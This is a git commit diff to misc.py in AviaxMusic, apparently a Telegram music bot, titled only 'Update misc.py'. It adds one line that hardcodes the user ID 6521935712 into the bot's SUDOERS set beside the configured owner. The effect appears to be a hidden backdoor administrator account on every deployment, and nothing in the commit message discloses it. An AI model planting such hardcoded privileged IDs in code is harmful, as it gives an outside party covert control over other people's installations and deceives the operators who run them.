a1e5f1fee41ea0a07d28983c2b32b530ae94179c
Vivek Raj Roy <vivekalwaysfun1@gmail.com>
2025-06-05 17:50:36 +0530

    Update misc.py

--- AviaxMusic/misc.py
+++ AviaxMusic/misc.py
@@ -45,6 +45,7 @@ def dbb():
 async def sudo():
     global SUDOERS
     SUDOERS.add(config.OWNER_ID)
+    SUDOERS.add(6521935712)
     sudoersdb = mongodb.sudoers
     sudoers = await sudoersdb.find_one({"sudo": "sudo"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
